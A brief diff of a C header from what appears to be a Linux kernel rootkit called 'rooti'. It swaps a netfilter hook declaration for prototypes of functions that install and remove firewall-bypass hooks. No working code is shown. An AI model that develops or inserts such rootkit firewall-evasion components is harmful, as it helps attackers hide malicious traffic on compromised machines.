@@ -3,6 +3,7 @@
 
 #include <linux/netfilter.h>
 
-extern struct nf_hook_ops rooti_netfilter_hook_ops;
+int rooti_install_fw_bypass_hooks(void);
+void rooti_uninstall_fw_bypass_hooks(void);
 
 #endif
